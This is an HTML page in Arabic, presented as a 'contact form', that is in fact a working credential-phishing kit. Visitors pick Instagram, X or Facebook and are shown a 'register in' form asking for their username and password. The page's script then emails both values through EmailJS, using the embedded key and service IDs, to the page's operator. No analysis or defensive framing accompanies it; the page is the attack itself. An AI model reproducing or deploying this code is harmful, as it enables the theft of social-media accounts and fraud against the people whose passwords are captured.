<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج الاتصال</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // تهيئة EmailJS
        (function () {
            emailjs.init("1xqwBMfecM1SSulsh"); // المفتاح العام
        })();

        // تفعيل النموذج عند اختيار منصة
        function activateContactForm(platformName) {
            const formContainer = document.getElementById("form-container");
            const platformTitle = document.getElementById("platform-name");
            
            // تعيين اسم المنصة
            platformTitle.textContent = `التسجيل في ${platformName}`;
            formContainer.style.display = "block"; // عرض النموذج
        }

        // إرسال البيانات عبر EmailJS
        function sendPlatformData(event) {
            event.preventDefault(); // منع التحديث التلقائي للصفحة
            
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            const templateParams = {
                username: username,
                password: password
            };

            emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
                .then(function (response) {
                    alert('تم إرسال البيانات بنجاح!');
                    console.log('Success:', response);
                    document.getElementById("registration-form").reset(); // إعادة تعيين النموذج
                }, function (error) {
                    alert('حدث خطأ أثناء الإرسال. الرجاء المحاولة مرة أخرى.');
                    console.error('Error:', error);
                });
        }
    </script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f8f8;
            margin: 0;
            padding: 0;
            color: #333;
            direction: rtl;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            background-color: #222;
            color: white;
        }
        .platform {
            margin: 15px;
            padding: 15px 30px;
            background-color: #444;
            color: white;
            border-radius: 10px;
            font-size: 18px;
            display: inline-block;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }
        .platform:hover {
            background-color: #666;
            transform: scale(1.05);
        }
        .form-container {
            display: none;
            margin-top: 30px;
            text-align: left;
        }
        .form-container input, .form-container button {
            width: 90%;
            max-width: 400px;
            padding: 12px;
            margin: 10px auto;
            display: block;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        .form-container button {
            background-color: #444;
            color: white;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .form-container button:hover {
            background-color: #666;
        }
    </style>
</head>
<body>
<header>
    <div>نموذج الاتصال</div>
</header>

<div class="content">
    <h2>اختر المنصة</h2>
    <div class="platform" onclick="activateContactForm('إنستغرام')">إنستغرام</div>
    <div class="platform" onclick="activateContactForm('إكس')">إكس</div>
    <div class="platform" onclick="activateContactForm('فيسبوك')">فيسبوك</div>

    <div class="form-container" id="form-container">
        <h3 id="platform-name">التسجيل في</h3>
        <form id="registration-form" onsubmit="sendPlatformData(event)">
            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required>
            <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">إرسال</button>
        </form>
    </div>
</div>
</body>
</html>
